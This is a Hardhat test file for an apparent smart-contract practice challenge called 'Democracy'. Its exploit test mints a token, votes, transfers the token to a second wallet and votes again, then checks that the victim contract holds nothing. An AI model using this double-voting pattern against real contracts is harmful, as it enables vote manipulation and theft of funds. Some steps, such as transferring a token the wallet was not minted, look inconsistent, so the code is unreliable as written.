const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [
            owner,
            attackerWallet1,
            attackerWallet2,
            attackerWallet3,
            attackerWallet4,
            attackerWallet5,
            attackerWallet6,
            attackerWallet7,
            attackerWallet8,
            attackerWallet9,
            attackerWallet10,
            attackerWallet11,
        ] = await ethers.getSigners();

        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return {
            victimContract,
            owner,
            attackerWallet1,
            attackerWallet2,
            attackerWallet3,
            attackerWallet4,
            attackerWallet5,
            attackerWallet6,
            attackerWallet7,
            attackerWallet8,
            attackerWallet9,
            attackerWallet10,
        };
    }

    describe("exploit", async function () {
        let victimContract,
            owner,
            attackerWallet1,
            attackerWallet2,
            attackerWallet3,
            attackerWallet4,
            attackerWallet5,
            attackerWallet6,
            attackerWallet7,
            attackerWallet8,
            attackerWallet9,
            attackerWallet10;
        before(async function () {
            ({
                victimContract,
                owner,
                attackerWallet1,
                attackerWallet2,
                attackerWallet3,
                attackerWallet4,
                attackerWallet5,
                attackerWallet6,
                attackerWallet7,
                attackerWallet8,
                attackerWallet9,
                attackerWallet10,
            } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory(
                "DemocracyAttacker",
            );
            const attackerContract = await AttackerFactory.deploy();

            const mintTx = await victimContract.mint(
                attackerContract.address,
                999,
                { value: ethers.utils.parseEther("1000") },
            );
            await mintTx.wait();

            const voteTx1 = await victimContract
                .connect(attackerWallet1)
                .vote(ethers.constants.AddressZero);
            await voteTx1.wait();

            const transferTx1 = await victimContract
                .connect(attackerWallet1)
                .transferFrom(
                    attackerWallet1.address,
                    attackerWallet2.address,
                    999,
                );
            await transferTx1.wait();
            const voteTx2 = await victimContract
                .connect(attackerWallet2)
                .vote(ethers.constants.AddressZero);
            await voteTx2.wait();
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(
                victimContract.address,
            );
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
